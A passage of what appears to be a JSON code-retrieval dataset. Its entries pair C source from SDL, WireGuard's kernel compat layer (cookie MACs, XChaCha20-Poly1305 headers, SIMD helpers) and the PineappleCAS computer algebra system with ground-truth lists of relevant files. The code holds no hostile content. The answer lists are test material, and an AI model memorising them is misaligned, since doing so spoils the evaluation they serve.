SDL_bool SDL_RectEquals(const SDL_Rect *a, const SDL_Rect *b)\n{\n    return (a && b && (a->x == b->x) && (a->y == b->y) &&\n            (a->w == b->w) && (a->h == b->h)) ? SDL_TRUE : SDL_FALSE;\n}\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasIntersection(const SDL_Rect * A,\n                                                     const SDL_Rect * B);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_IntersectRect(const SDL_Rect * A,\n                                                   const SDL_Rect * B,\n                                                   SDL_Rect * result);\n\n\nextern DECLSPEC void SDLCALL SDL_UnionRect(const SDL_Rect * A,\n                                           const SDL_Rect * B,\n                                           SDL_Rect * result);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_EnclosePoints(const SDL_Point * points,\n                                                   int count,\n                                                   const SDL_Rect * clip,\n                                                   SDL_Rect * result);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_IntersectRectAndLine(const SDL_Rect *\n                                                          rect, int *X1,\n                                                          int *Y1, int *X2,\n                                                          int *Y2);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_rect.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_surface.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_shape.h'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/cookie.c'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'",
            "'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'"
        ],
        "content": "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'\n:#include <asm/i387.h>\n\n'wireguard-linux-compat/src/cookie.c'\n:\n\n\n#include \"cookie.h\"\n#include \"peer.h\"\n#include \"device.h\"\n#include \"messages.h\"\n#include \"ratelimiter.h\"\n#include \"timers.h\"\n\n#include <zinc/blake2s.h>\n#include <zinc/chacha20poly1305.h>\n\n#include <net/ipv6.h>\n#include <crypto/algapi.h>\n\nvoid wg_cookie_checker_init(struct cookie_checker *checker,\n\t\t\t    struct wg_device *wg)\n{\n\tinit_rwsem(&checker->secret_lock);\n\tchecker->secret_birthdate = ktime_get_coarse_boottime_ns();\n\tget_random_bytes(checker->secret, NOISE_HASH_LEN);\n\tchecker->device = wg;\n}\n\nenum { COOKIE_KEY_LABEL_LEN = 8 };\nstatic const u8 mac1_key_label[COOKIE_KEY_LABEL_LEN] = \"mac1----\";\nstatic const u8 cookie_key_label[COOKIE_KEY_LABEL_LEN] = \"cookie--\";\n\nstatic void precompute_key(u8 key[NOISE_SYMMETRIC_KEY_LEN],\n\t\t\t   const u8 pubkey[NOISE_PUBLIC_KEY_LEN],\n\t\t\t   const u8 label[COOKIE_KEY_LABEL_LEN])\n{\n\tstruct blake2s_state blake;\n\n\tblake2s_init(&blake, NOISE_SYMMETRIC_KEY_LEN);\n\tblake2s_update(&blake, label, COOKIE_KEY_LABEL_LEN);\n\tblake2s_update(&blake, pubkey, NOISE_PUBLIC_KEY_LEN);\n\tblake2s_final(&blake, key);\n}\n\n\nvoid wg_cookie_checker_precompute_device_keys(struct cookie_checker *checker)\n{\n\tif (likely(checker->device->static_identity.has_identity)) {\n\t\tprecompute_key(checker->cookie_encryption_key,\n\t\t\t       checker->device->static_identity.static_public,\n\t\t\t       cookie_key_label);\n\t\tprecompute_key(checker->message_mac1_key,\n\t\t\t       checker->device->static_identity.static_public,\n\t\t\t       mac1_key_label);\n\t} else {\n\t\tmemset(checker->cookie_encryption_key, 0,\n\t\t       NOISE_SYMMETRIC_KEY_LEN);\n\t\tmemset(checker->message_mac1_key, 0, NOISE_SYMMETRIC_KEY_LEN);\n\t}\n}\n\nvoid wg_cookie_checker_precompute_peer_keys(struct wg_peer *peer)\n{\n\tprecompute_key(peer->latest_cookie.cookie_decryption_key,\n\t\t       peer->handshake.remote_static, cookie_key_label);\n\tprecompute_key(peer->latest_cookie.message_mac1_key,\n\t\t       peer->handshake.remote_static, mac1_key_label);\n}\n\nvoid wg_cookie_init(struct cookie *cookie)\n{\n\tmemset(cookie, 0, sizeof(*cookie));\n\tinit_rwsem(&cookie->lock);\n}\n\nstatic void compute_mac1(u8 mac1[COOKIE_LEN], const void *message, size_t len,\n\t\t\t const u8 key[NOISE_SYMMETRIC_KEY_LEN])\n{\n\tlen = len - sizeof(struct message_macs) +\n\t      offsetof(struct message_macs, mac1);\n\tblake2s(mac1, message, key, COOKIE_LEN, len, NOISE_SYMMETRIC_KEY_LEN);\n}\n\nstatic void compute_mac2(u8 mac2[COOKIE_LEN], const void *message, size_t len,\n\t\t\t const u8 cookie[COOKIE_LEN])\n{\n\tlen = len - sizeof(struct message_macs) +\n\t      offsetof(struct message_macs, mac2);\n\tblake2s(mac2, message, cookie, COOKIE_LEN, len, COOKIE_LEN);\n}\n\nstatic void make_cookie(u8 cookie[COOKIE_LEN], struct sk_buff *skb,\n\t\t\tstruct cookie_checker *checker)\n{\n\tstruct blake2s_state state;\n\n\tif (wg_birthdate_has_expired(checker->secret_birthdate,\n\t\t\t\t     COOKIE_SECRET_MAX_AGE)) {\n\t\tdown_write(&checker->secret_lock);\n\t\tchecker->secret_birthdate = ktime_get_coarse_boottime_ns();\n\t\tget_random_bytes(checker->secret, NOISE_HASH_LEN);\n\t\tup_write(&checker->secret_lock);\n\t}\n\n\tdown_read(&checker->secret_lock);\n\n\tblake2s_init_key(&state, COOKIE_LEN, checker->secret, NOISE_HASH_LEN);\n\tif (skb->protocol == htons(ETH_P_IP))\n\t\tblake2s_update(&state, (u8 *)&ip_hdr(skb)->saddr,\n\t\t\t       sizeof(struct in_addr));\n\telse if (skb->protocol == htons(ETH_P_IPV6))\n\t\tblake2s_update(&state, (u8 *)&ipv6_hdr(skb)->saddr,\n\t\t\t       sizeof(struct in6_addr));\n\tblake2s_update(&state, (u8 *)&udp_hdr(skb)->source, sizeof(__be16));\n\tblake2s_final(&state, cookie);\n\n\tup_read(&checker->secret_lock);\n}\n\nenum cookie_mac_state wg_cookie_validate_packet(struct cookie_checker *checker,\n\t\t\t\t\t\tstruct sk_buff *skb,\n\t\t\t\t\t\tbool check_cookie)\n{\n\tstruct message_macs *macs = (struct message_macs *)\n\t\t(skb->data + skb->len - sizeof(*macs));\n\tenum cookie_mac_state ret;\n\tu8 computed_mac[COOKIE_LEN];\n\tu8 cookie[COOKIE_LEN];\n\n\tret = INVALID_MAC;\n\tcompute_mac1(computed_mac, skb->data, skb->len,\n\t\t     checker->message_mac1_key);\n\tif (crypto_memneq(computed_mac, macs->mac1, COOKIE_LEN))\n\t\tgoto out;\n\n\tret = VALID_MAC_BUT_NO_COOKIE;\n\n\tif (!check_cookie)\n\t\tgoto out;\n\n\tmake_cookie(cookie, skb, checker);\n\n\tcompute_mac2(computed_mac, skb->data, skb->len, cookie);\n\tif (crypto_memneq(computed_mac, macs->mac2, COOKIE_LEN))\n\t\tgoto out;\n\n\tret = VALID_MAC_WITH_COOKIE_BUT_RATELIMITED;\n\tif (!wg_ratelimiter_allow(skb, dev_net(checker->device->dev)))\n\t\tgoto out;\n\n\tret = VALID_MAC_WITH_COOKIE;\n\nout:\n\treturn ret;\n}\n\nvoid wg_cookie_add_mac_to_packet(void *message, size_t len,\n\t\t\t\t struct wg_peer *peer)\n{\n\tstruct message_macs *macs = (struct message_macs *)\n\t\t((u8 *)message + len - sizeof(*macs));\n\n\tdown_write(&peer->latest_cookie.lock);\n\tcompute_mac1(macs->mac1, message, len,\n\t\t     peer->latest_cookie.message_mac1_key);\n\tmemcpy(peer->latest_cookie.last_mac1_sent, macs->mac1, COOKIE_LEN);\n\tpeer->latest_cookie.have_sent_mac1 = true;\n\tup_write(&peer->latest_cookie.lock);\n\n\tdown_read(&peer->latest_cookie.lock);\n\tif (peer->latest_cookie.is_valid &&\n\t    !wg_birthdate_has_expired(peer->latest_cookie.birthdate,\n\t\t\t\tCOOKIE_SECRET_MAX_AGE - COOKIE_SECRET_LATENCY))\n\t\tcompute_mac2(macs->mac2, message, len,\n\t\t\t     peer->latest_cookie.cookie);\n\telse\n\t\tmemset(macs->mac2, 0, COOKIE_LEN);\n\tup_read(&peer->latest_cookie.lock);\n}\n\nvoid wg_cookie_message_create(struct message_handshake_cookie *dst,\n\t\t\t      struct sk_buff *skb, __le32 index,\n\t\t\t      struct cookie_checker *checker)\n{\n\tstruct message_macs *macs = (struct message_macs *)\n\t\t((u8 *)skb->data + skb->len - sizeof(*macs));\n\tu8 cookie[COOKIE_LEN];\n\n\tdst->header.type = cpu_to_le32(MESSAGE_HANDSHAKE_COOKIE);\n\tdst->receiver_index = index;\n\tget_random_bytes_wait(dst->nonce, COOKIE_NONCE_LEN);\n\n\tmake_cookie(cookie, skb, checker);\n\txchacha20poly1305_encrypt(dst->encrypted_cookie, cookie, COOKIE_LEN,\n\t\t\t\t  macs->mac1, COOKIE_LEN, dst->nonce,\n\t\t\t\t  checker->cookie_encryption_key);\n}\n\nvoid wg_cookie_message_consume(struct message_handshake_cookie *src,\n\t\t\t       struct wg_device *wg)\n{\n\tstruct wg_peer *peer = NULL;\n\tu8 cookie[COOKIE_LEN];\n\tbool ret;\n\n\tif (unlikely(!wg_index_hashtable_lookup(wg->index_hashtable,\n\t\t\t\t\t\tINDEX_HASHTABLE_HANDSHAKE |\n\t\t\t\t\t\tINDEX_HASHTABLE_KEYPAIR,\n\t\t\t\t\t\tsrc->receiver_index, &peer)))\n\t\treturn;\n\n\tdown_read(&peer->latest_cookie.lock);\n\tif (unlikely(!peer->latest_cookie.have_sent_mac1)) {\n\t\tup_read(&peer->latest_cookie.lock);\n\t\tgoto out;\n\t}\n\tret = xchacha20poly1305_decrypt(\n\t\tcookie, src->encrypted_cookie, sizeof(src->encrypted_cookie),\n\t\tpeer->latest_cookie.last_mac1_sent, COOKIE_LEN, src->nonce,\n\t\tpeer->latest_cookie.cookie_decryption_key);\n\tup_read(&peer->latest_cookie.lock);\n\n\tif (ret) {\n\t\tdown_write(&peer->latest_cookie.lock);\n\t\tmemcpy(peer->latest_cookie.cookie, cookie, COOKIE_LEN);\n\t\tpeer->latest_cookie.birthdate = ktime_get_coarse_boottime_ns();\n\t\tpeer->latest_cookie.is_valid = true;\n\t\tpeer->latest_cookie.have_sent_mac1 = false;\n\t\tup_write(&peer->latest_cookie.lock);\n\t} else {\n\t\tnet_dbg_ratelimited(\"%s: Could not decrypt invalid cookie response\\n\",\n\t\t\t\t    wg->dev->name);\n\t}\n\nout:\n\twg_peer_put(peer);\n}\n\n'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n\n'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'\n:\n\n\n#ifndef _ZINC_CHACHA20POLY1305_H\n#define _ZINC_CHACHA20POLY1305_H\n\n#include <linux/simd.h>\n#include <linux/types.h>\n\nstruct scatterlist;\n\nenum chacha20poly1305_lengths {\n\tXCHACHA20POLY1305_NONCE_SIZE = 24,\n\tCHACHA20POLY1305_KEY_SIZE = 32,\n\tCHACHA20POLY1305_AUTHTAG_SIZE = 16\n};\n\nvoid chacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t      const u8 *ad, const size_t ad_len,\n\t\t\t      const u64 nonce,\n\t\t\t      const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check chacha20poly1305_encrypt_sg_inplace(\n\tstruct scatterlist *src, const size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u64 nonce,\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE], simd_context_t *simd_context);\n\nbool __must_check\nchacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t const u8 *ad, const size_t ad_len, const u64 nonce,\n\t\t\t const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check chacha20poly1305_decrypt_sg_inplace(\n\tstruct scatterlist *src, size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u64 nonce,\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE], simd_context_t *simd_context);\n\nvoid xchacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t       const u8 *ad, const size_t ad_len,\n\t\t\t       const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\t\t\t       const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check xchacha20poly1305_decrypt(\n\tu8 *dst, const u8 *src, const size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\n#endif\n\n'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'\n:#ifndef _COMPAT_ASM_SIMD_H\n#define _COMPAT_ASM_SIMD_H\n\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#endif\n\nstatic __must_check inline bool may_use_simd(void)\n{\n#if defined(CONFIG_X86_64)\n\treturn irq_fpu_usable();\n#elif defined(CONFIG_ARM64) && defined(CONFIG_KERNEL_MODE_NEON)\n\treturn true;\n#elif defined(CONFIG_ARM) && defined(CONFIG_KERNEL_MODE_NEON)\n\treturn !in_nmi() && !in_irq() && !in_serving_softirq();\n#else\n\treturn false;\n#endif\n}\n\n#endif\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'",
            "'wireguard-linux-compat/src/cookie.c'"
        ]
    },
    {
        "files": [
            "'PineappleCAS/src/ast.h'",
            "'PineappleCAS/src/export.c'",
            "'PineappleCAS/src/parser.h'",
            "'PineappleCAS/src/error.h'"
        ],
        "content": "'PineappleCAS/src/ast.h'\n:#ifndef AST_H_\n#define AST_H_\n\n#include \"imath/imrat.h\"\n#include \"error.h\"\n\n#include <stdlib.h>\n#include <stdbool.h>\n\n#define LSIZE unsigned\n#define RADIX 10\n\ntypedef enum {\n    NODE_NUMBER, NODE_SYMBOL, NODE_OPERATOR\n} NodeType;\n\n#define is_op_commutative(op) ((op) == OP_ADD || (op) == OP_MULT)\n\n#define is_op_operator(op) ((op) >= OP_ADD && (op) <= OP_LOG)\n#define is_op_function(op) ((op) >= OP_INT && (op) <= OP_TANH_INV)\n\n#define is_op_nary(op) ((op) >= OP_ADD && (op) <= OP_LOG)\n#define is_op_unary(op) ((op) >= OP_FACTORIAL && (op) <= OP_TANH_INV)\n\ntypedef enum {\n\n    OP_ADD,\n    OP_MULT, OP_DIV,\n\n    OP_POW, OP_ROOT,\n    OP_LOG,\n\n\n    OP_DERIV,\n\n\n    OP_FACTORIAL,\n\n    OP_INT, OP_ABS,\n\n    OP_SIN, OP_SIN_INV,\n    OP_COS, OP_COS_INV,\n    OP_TAN, OP_TAN_INV,\n\n    OP_SINH, OP_SINH_INV,\n    OP_COSH, OP_COSH_INV,\n    OP_TANH, OP_TANH_INV,\n\n    AMOUNT_OPS\n} OperatorType;\n\n#define AMOUNT_SYMBOLS 30\n\ntypedef enum {\n    SYM_A = 'A',\n    SYM_B, SYM_C, SYM_D, SYM_E, SYM_F,\n    SYM_G, SYM_H, SYM_I, SYM_J, SYM_K,\n    SYM_L, SYM_M, SYM_N, SYM_O, SYM_P,\n    SYM_Q, SYM_R, SYM_S, SYM_T, SYM_U,\n    SYM_V, SYM_W, SYM_X, SYM_Y, SYM_Z,\n\n    SYM_IMAG,\n\n    SYM_PI, SYM_EULER, SYM_THETA,\n\n    SYM_INVALID\n} Symbol;\n\n\n#define optype(e)       e->op.operator.type\n#define isoptype(e, op) ((e)->type == NODE_OPERATOR && optype(e) == (op))\n#define opbase(e)       e->op.operator.base\n\n#define is_ast_int(e, val) ((e)->type == NODE_NUMBER && mp_rat_compare_value((e)->op.num, val, 1) == 0)\n\ntypedef struct _pcas_Node {\n\n    NodeType type;\n\n    struct _pcas_Node *next;\n\n    union {\n\n        mp_rat num;\n\n\n        Symbol symbol;\n\n\n        struct {\n            OperatorType type;\n\n\n            struct _pcas_Node *base;\n\n        } operator;\n    } op;\n\n} pcas_ast_t;\n\n\n\nmp_rat num_FromString(const char *str);\nmp_rat num_FromInt(mp_small num);\nmp_rat num_FromFraction(mp_small num, mp_small den);\nmp_rat num_Copy(mp_rat other);\nchar *num_ToString(mp_rat num, mp_size precision);\nvoid num_Cleanup(mp_rat num);\n\npcas_ast_t *ast_MakeNumber(mp_rat num);\npcas_ast_t *ast_MakeSymbol(char symbol);\n\npcas_ast_t *ast_MakeOperator(OperatorType type);\npcas_ast_t *ast_MakeUnary(OperatorType type, pcas_ast_t *operand);\npcas_ast_t *ast_MakeBinary(OperatorType type, pcas_ast_t *left, pcas_ast_t *right);\n\npcas_ast_t *ast_Copy(pcas_ast_t *e);\nbool ast_Compare(pcas_ast_t *a, pcas_ast_t *b);\n\nvoid ast_Cleanup(pcas_ast_t *e);\n\n\npcas_error_t ast_ChildAppend(pcas_ast_t *parent, pcas_ast_t *child);\npcas_error_t ast_ChildInsert(pcas_ast_t *parent, pcas_ast_t *child, LSIZE index);\n\npcas_ast_t *ast_ChildGet(pcas_ast_t *parent, LSIZE index);\npcas_ast_t *ast_ChildGetLast(pcas_ast_t *parent);\n\n\nLSIZE ast_ChildIndexOf(pcas_ast_t *parent, pcas_ast_t *child);\n\n\npcas_ast_t *ast_ChildRemove(pcas_ast_t *parent, pcas_ast_t *child);\npcas_ast_t *ast_ChildRemoveIndex(pcas_ast_t *parent, LSIZE index);\n\nLSIZE ast_ChildLength(pcas_ast_t *parent);\n\n#endif\n'PineappleCAS/src/export.c'\n:#include \"parser.h\"\n\n\n#include \"cas/cas.h\"\n\n#include <string.h>\n\n#define add_byte(byte) do {if(data != NULL) data[index] = (byte); index++;} while(0)\n#define add_token(token) do {uint8_t _tmp_i; for(_tmp_i = 0; _tmp_i < lookup[(token)].length; _tmp_i++) add_byte(lookup[token].bytes[_tmp_i]);} while(0)\n\nstatic uint8_t precedence_type(OperatorType type) {\n    switch(type) {\n    case OP_ADD:\n        return 5;\n    case OP_MULT: case OP_DIV:\n        return 10;\n    case OP_POW: case OP_ROOT:\n        return 15;\n    default:\n        return 20;\n    }\n}\n\nstatic uint8_t precedence(pcas_ast_t *e) {\n    if(e->type == NODE_OPERATOR)\n        return precedence_type(optype(e));\n    return 255;\n}\n\n#define is_right_operator_type(type) ((type) == OP_FACTORIAL)\n\n#define need_paren(parent, child) ( (((parent)->type == NODE_OPERATOR && is_op_operator(optype(parent)) && !is_op_commutative(optype(parent)) && precedence(child) <= precedence(parent)) \\\n                                    || precedence(child) < precedence(parent)) \\\n                                    || (is_right_operator_type(optype(parent)) && (child)->type == NODE_NUMBER && mp_rat_compare_zero((child)->op.num) < 0) )\n\npcas_ast_t *rightmost(pcas_ast_t *e) {\n    if(e->type == NODE_OPERATOR) {\n        switch(optype(e)) {\n        case OP_POW:\n            return rightmost(ast_ChildGetLast(e));\n        default:\n            break;\n        }\n    }\n\n    return e;\n}\npcas_ast_t *leftmost(pcas_ast_t *e) {\n\n    if(e->type == NODE_OPERATOR) {\n        switch(optype(e)) {\n        case OP_POW:\n        case OP_ROOT:\n\n            if(is_ast_int(ast_ChildGet(e, 0), 2))\n                return e;\n\n        case OP_LOG:\n        case OP_FACTORIAL:\n            return leftmost(opbase(e));\n        default:\n            break;\n        }\n    }\n\n    return e;\n}\n\n\nstatic unsigned _to_binary(pcas_ast_t *e, uint8_t *data, unsigned index, struct Identifier *lookup, pcas_error_t *err) {\n\n    switch(e->type) {\n    case NODE_NUMBER: {\n        char *buffer;\n        unsigned i;\n\n        buffer = num_ToString(e->op.num, 6);\n\n        for(i = 0; i < strlen(buffer); i++) {\n            uint8_t c = (uint8_t)buffer[i];\n            if(c == '.')\n                c = lookup[TOK_PERIOD].bytes[0];\n            else if(c == '-')\n                c = lookup[TOK_NEGATE].bytes[0];\n            add_byte(c);\n        }\n\n        free(buffer);\n        break;\n    } case NODE_SYMBOL:\n\n        switch(e->op.symbol) {\n        case SYM_IMAG:  add_token(TOK_IMAG);     break;\n        case SYM_PI:    add_token(TOK_PI);       break;\n        case SYM_EULER: add_token(TOK_EULER);    break;\n        case SYM_THETA: add_token(TOK_THETA);    break;\n        default:        add_byte(e->op.symbol);  break;\n        }\n\n        break;\n    case NODE_OPERATOR: {\n        unsigned i;\n\n        switch(optype(e)) {\n        case OP_ADD: {\n            pcas_ast_t *child;\n            pcas_ast_t *e_copy = ast_Copy(e);\n\n            for(i = 0; i < ast_ChildLength(e_copy) - 1; i++) {\n                pcas_ast_t *next;\n\n                child = ast_ChildGet(e_copy, i);\n                next = child->next;\n\n                if(need_paren(e_copy, child)) add_token(TOK_OPEN_PAR);\n                index = _to_binary(child, data, index, lookup, err);\n                if(need_paren(e_copy, child)) add_token(TOK_CLOSE_PAR);\n\n                if(absolute_val(next))\n                    add_token(TOK_MINUS);\n                else\n                    add_token(TOK_PLUS);\n            }\n\n            child = ast_ChildGetLast(e_copy);\n\n            if(need_paren(e_copy, child)) add_token(TOK_OPEN_PAR);\n            index = _to_binary(child, data, index, lookup, err);\n            if(need_paren(e_copy, child)) add_token(TOK_CLOSE_PAR);\n\n            ast_Cleanup(e_copy);\n\n            break;\n        }\n        case OP_MULT: {\n            pcas_ast_t *child;\n            bool needs_mult;\n            bool root_special_case;\n\n            for(i = 0; i < ast_ChildLength(e) - 1; i++) {\n                pcas_ast_t *next;\n\n                child = ast_ChildGet(e, i);\n                next = child->next;\n\n\n                root_special_case = isoptype(child, OP_ROOT) && !is_ast_int(ast_ChildGet(child, 0), 2);\n\n                if(is_ast_int(child, -1)) {\n                    add_token(TOK_NEGATE);\n                } else if(is_ast_int(child, 1)) {\n\n                    continue;\n                } else {\n\n                    if(need_paren(e, child) || root_special_case) add_token(TOK_OPEN_PAR);\n                    index = _to_binary(child, data, index, lookup, err);\n                    if(need_paren(e, child) || root_special_case) add_token(TOK_CLOSE_PAR);\n                }\n\n                needs_mult = !need_paren(e, child) && !root_special_case &&\n                        ((rightmost(child)->type == NODE_NUMBER && !is_ast_int(rightmost(child), -1) && leftmost(next)->type == NODE_NUMBER)\n\n                        || isoptype(child, OP_MULT));\n\n                if(needs_mult && !isoptype(next, OP_ROOT))\n                    add_token(TOK_MULTIPLY);\n\n            }\n\n            child = ast_ChildGetLast(e);\n            root_special_case = isoptype(child, OP_ROOT) && !is_ast_int(ast_ChildGet(child, 0), 2);\n\n            if(!is_ast_int(child, 1)) {\n                if(need_paren(e, child) || root_special_case) add_token(TOK_OPEN_PAR);\n                index = _to_binary(child, data, index, lookup, err);\n                if(need_paren(e, child) || root_special_case) add_token(TOK_CLOSE_PAR);\n            }\n\n            break;\n        } case OP_DIV:\n          case OP_POW: {\n            pcas_ast_t *a, *b;\n\n            a = ast_ChildGet(e, 0);\n            b = ast_ChildGet(e, 1);\n\n            if(need_paren(e, a)) add_token(TOK_OPEN_PAR);\n            index = _to_binary(a, data, index, lookup, err);\n            if(need_paren(e, a)) add_token(TOK_CLOSE_PAR);\n\n            add_token(optype(e) == OP_DIV ? TOK_FRACTION : TOK_POWER);\n\n            if((optype(e) == OP_POW && b->type != NODE_NUMBER && b->type != NODE_SYMBOL) || need_paren(e, b)) add_token(TOK_OPEN_PAR);\n            index = _to_binary(b, data, index, lookup, err);\n            if((optype(e) == OP_POW && b->type != NODE_NUMBER && b->type != NODE_SYMBOL) || need_paren(e, b)) add_token(TOK_CLOSE_PAR);\n\n            break;\n        } case OP_ROOT: {\n            pcas_ast_t *a, *b;\n\n            a = ast_ChildGet(e, 0);\n            b = ast_ChildGet(e, 1);\n\n            if(is_ast_int(a, 2)) {\n                add_token(TOK_SQRT);\n\n                if(need_paren(e, b)) add_token(TOK_OPEN_PAR);\n                index = _to_binary(b, data, index, lookup, err);\n                if(need_paren(e, b)) add_token(TOK_CLOSE_PAR);\n\n                add_token(TOK_CLOSE_PAR);\n            } else {\n                if(need_paren(e, a)) add_token(TOK_OPEN_PAR);\n                index = _to_binary(a, data, index, lookup, err);\n                if(need_paren(e, a)) add_token(TOK_CLOSE_PAR);\n\n                add_token(TOK_ROOT);\n\n                if(need_paren(e, b)) add_token(TOK_OPEN_PAR);\n                index = _to_binary(b, data, index, lookup, err);\n                if(need_paren(e, b)) add_token(TOK_CLOSE_PAR);\n            }\n\n            break;\n        }\n        case OP_LOG: {\n            pcas_ast_t *a, *b;\n\n            a = ast_ChildGet(e, 0);\n            b = ast_ChildGet(e, 1);\n\n            if(a->type == NODE_SYMBOL && a->op.symbol == SYM_EULER) {\n                add_token(TOK_LN);\n                index = _to_binary(b, data, index, lookup, err);\n                add_token(TOK_CLOSE_PAR);\n                break;\n            } else if(a->type == NODE_NUMBER && mp_rat_compare_value(a->op.num, 10, 1) == 0) {\n                add_token(TOK_LOG);\n                index = _to_binary(b, data, index, lookup, err);\n                add_token(TOK_CLOSE_PAR);\n                break;\n            }\n\n            add_token(TOK_LOG_BASE);\n            index = _to_binary(b, data, index, lookup, err);\n            add_token(TOK_COMMA);\n            index = _to_binary(a, data, index, lookup, err);\n            add_token(TOK_CLOSE_PAR);\n\n            break;\n        }  case OP_DERIV: {\n            pcas_ast_t *a, *b, *c;\n\n            a = ast_ChildGet(e, 0);\n            b = ast_ChildGet(e, 1);\n            c = ast_ChildGet(e, 2);\n\n            add_token(TOK_DERIV);\n            index = _to_binary(a, data, index, lookup, err);\n            add_token(TOK_COMMA);\n            index = _to_binary(b, data, index, lookup, err);\n            add_token(TOK_COMMA);\n            index = _to_binary(c, data, index, lookup, err);\n            add_token(TOK_CLOSE_PAR);\n\n            break;\n        } case OP_FACTORIAL: {\n\n            pcas_ast_t *a;\n\n            a = ast_ChildGet(e, 0);\n\n            if(need_paren(e, a)) add_token(TOK_OPEN_PAR);\n            index = _to_binary(a, data, index, lookup, err);\n            if(need_paren(e, a)) add_token(TOK_CLOSE_PAR);\n\n            add_token(TOK_FACTORIAL);\n\n            break;\n        } default:\n\n            switch(optype(e)) {\n                case OP_INT:        add_token(TOK_INT);      break;\n                case OP_ABS:        add_token(TOK_ABS);      break;\n                case OP_SIN:        add_token(TOK_SIN);      break;\n                case OP_SIN_INV:    add_token(TOK_SIN_INV);  break;\n                case OP_COS:        add_token(TOK_COS);      break;\n                case OP_COS_INV:    add_token(TOK_COS_INV);  break;\n                case OP_TAN:        add_token(TOK_TAN);      break;\n                case OP_TAN_INV:    add_token(TOK_TAN_INV);  break;\n                case OP_SINH:       add_token(TOK_SINH);     break;\n                case OP_SINH_INV:   add_token(TOK_SINH_INV); break;\n                case OP_COSH:       add_token(TOK_COSH);     break;\n                case OP_COSH_INV:   add_token(TOK_COSH_INV); break;\n                case OP_TANH:       add_token(TOK_TANH);     break;\n                case OP_TANH_INV:   add_token(TOK_TANH_INV); break;\n                default: break;\n            }\n\n            index = _to_binary(ast_ChildGet(e, 0), data, index, lookup, err);\n            add_token(TOK_CLOSE_PAR);\n            break;\n        }\n\n        break;\n    }\n    }\n\n    return index;\n}\n\nuint8_t *export_to_binary(pcas_ast_t *e, unsigned *len, struct Identifier *lookup, pcas_error_t *err) {\n    uint8_t *data;\n\n    *err = E_SUCCESS;\n\n    *len = _to_binary(e, NULL, 0, lookup, err);\n\n    if(*err != E_SUCCESS) {\n        *len = 